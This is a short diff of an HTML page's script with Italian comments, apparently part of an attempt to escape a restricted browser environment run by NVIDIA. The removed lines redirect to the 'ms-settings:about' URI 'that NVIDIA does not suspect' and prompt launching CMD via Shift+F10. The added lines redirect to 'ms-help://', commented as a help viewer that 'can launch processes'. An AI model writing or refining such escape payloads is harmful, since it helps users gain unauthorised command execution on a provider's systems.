@@ -13,10 +13,8 @@
 
     <script>
         function inject() {
-            // Usiamo un URI handler che NVIDIA non sospetta
-            const cmd = "ms-settings:about"; 
-            window.location.href = cmd;
-            alert("Sfrutta la finestra ms-settings per lanciare CMD (Shift+F10)");
+    // Questo apre il visualizzatore di aiuto HTML, che può lanciare processi
+    window.location.href = "ms-help://"; 
         }
     </script>
 </body>
